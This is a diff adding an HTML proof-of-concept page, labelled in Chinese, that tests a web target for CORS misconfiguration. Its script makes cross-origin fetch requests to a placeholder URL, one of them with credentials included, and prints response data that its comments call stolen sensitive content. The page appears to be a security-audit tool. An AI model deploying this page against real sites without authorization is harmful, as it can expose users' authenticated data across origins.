@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>CORS 跨域配置错误测试 (POC)</title>
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            padding: 30px; 
+            background-color: #f8f9fa;
+            color: #333;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        h1 { color: #dc3545; border-bottom: 2px solid #dc3545; padding-bottom: 10px; }
+        .config-box { background: #fff; border: 1px solid #dee2e6; padding: 15px; border-radius: 6px; margin-bottom: 20px; }
+        .result { padding: 12px; margin: 8px 0; border-radius: 4px; border-left: 5px solid #6c757d; font-family: monospace; white-space: pre-wrap; word-break: break-all; }
+        .info { background: #e9ecef; border-left-color: #17a2b8; }
+        .success { background: #d4edda; color: #155724; border-left-color: #28a745; }
+        .error { background: #f8d7da; color: #721c24; border-left-color: #dc3545; }
+        button { background-color: #007bff; color: white; border: none; padding: 10px 20px; margin-right: 10px; border-radius: 4px; cursor: pointer; font-size: 14px; }
+        button:hover { background-color: #0056b3; }
+        .tip { font-size: 13px; color: #6c757d; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+    <h1>🔴 CORS 跨域配置错误测试 (POC)</h1>
+    
+    <div class="config-box">
+        <p><strong>测试目标 (TARGET):</strong> <span id="target-url">Loading...</span></p>
+        <p><strong>说明:</strong> 本页面用于检测目标系统是否存在 CORS（跨域资源共享）配置缺陷。请确保在<b>非目标域名</b>（如本地搭建的测试环境或第三方域名）下运行此脚本。</p>
+    </div>
+    
+    <div>
+        <button onclick="testCORS()">1. 测试基础跨域读取</button>
+        <button onclick="testCORSWithCredentials()">2. 测试带凭证跨域 (Credentials)</button>
+        <button onclick="clearLogs()" style="background-color: #6c757d;">清空日志</button>
+    </div>
+
+    <div class="tip">
+        💡 <b>技术提示:</b> <br>
+        - 若“基础跨域”成功而“带凭证”失败，说明目标仅配置了 <code>Access-Control-Allow-Origin: *</code>（不允许带 Cookie）。<br>
+        - 若“带凭证”也成功，说明目标允许第三方网站凭证，且 Origin 是动态反射的，此种情况危害极大。
+    </div>
+    
+    <h3>📋 测试日志输出:</h3>
+    <div id="results"></div>
+    
+    <script>
+        // 更改此处为你需要测试的目标 API 地址
+        const TARGET = 'https://example.com/eportal/ui?pageId=test'; 
+        
+        document.getElementById('target-url').textContent = TARGET;
+        
+        function log(msg, type='info') {
+            const div = document.createElement('div');
+            div.className = 'result ' + type;
+            // 获取当前时间戳
+            const timestamp = new Date().toLocaleTimeString();
+            div.textContent = `[${timestamp}] ${msg}`;
+            document.getElementById('results').appendChild(div);
+        }
+
+        function clearLogs() {
+            document.getElementById('results').innerHTML = '';
+        }
+        
+        // 1. 基础 CORS 测试
+        async function testCORS() {
+            log('正在发起基础 CORS 跨域读取请求...', 'info');
+            try {
+                const response = await fetch(TARGET, {
+                    method: 'GET',
+                    mode: 'cors'
+                });
+                
+                // 如果没有触发 CORS 阻止，说明请求成功
+                log(`[✔] 基础 CORS 测试成功! HTTP 状态码: ${response.status}`, 'success');
+                log(`[ℹ] 响应长度: ${response.headers.get('content-length') || '未知 (未暴露该 Header)'}`, 'success');
+                
+                // 尝试读取并读取部分内容，证明可以窃取数据
+                const text = await response.text();
+                log(`[✔] 成功读取敏感数据片段:\n----------------\n${text.substring(0, 200)}...\n----------------`, 'success');
+                
+            } catch (e) {
+                log(`[❌] 基础 CORS 测试失败: ${e.message}`, 'error');
+                log(`提示: 可能是目标未配置 CORS 头，或当前浏览器策略拦截了请求。`, 'info');
+            }
+        }
+        
+        // 2. 带凭证的 CORS 测试 (Cookie / 认证信息)
+        async function testCORSWithCredentials() {
+            log('正在发起带凭证（Credentials）的跨域请求...', 'info');
+            try {
+                const response = await fetch(TARGET, {
+                    method: 'GET',
+                    mode: 'cors',
+                    credentials: 'include' // 关键参数：允许携带 Cookie 
+                });
+                
+                log(`[✔] 极其危险！带凭证的跨域读取成功! HTTP 状态码: ${response.status}`, 'success');
+                const text = await response.text();
+                log(`[✔] 成功在认证状态下读取数据:\n----------------\n${text.substring(0, 200)}...\n----------------`, 'success');
+                
+            } catch (e) {
+                log(`[❌] 带凭证的跨域请求失败: ${e.message}`, 'error');
+                log(`原因分析: 如果基础测试成功但此处失败，说明目标服务器虽然配置了 '*'，但浏览器基于安全策略，禁止在 Origin 为 '*' 时携带凭证（Credentials）。`, 'info');
+            }
+        }
+        
+        window.onload = () => {
+            log('POC 页面加载完成，请点击上方按钮开始审计。', 'info');
+            if (window.location.hostname === 'example.com') {
+                log('⚠️ 警告: 你当前在 example.com 域名下运行此脚本，同源请求无法准确测试 CORS 配置，请在第三方域名或本地 localhost 下运行。', 'error');
+            }
+        };
+    </script>
+</body>
+</html>
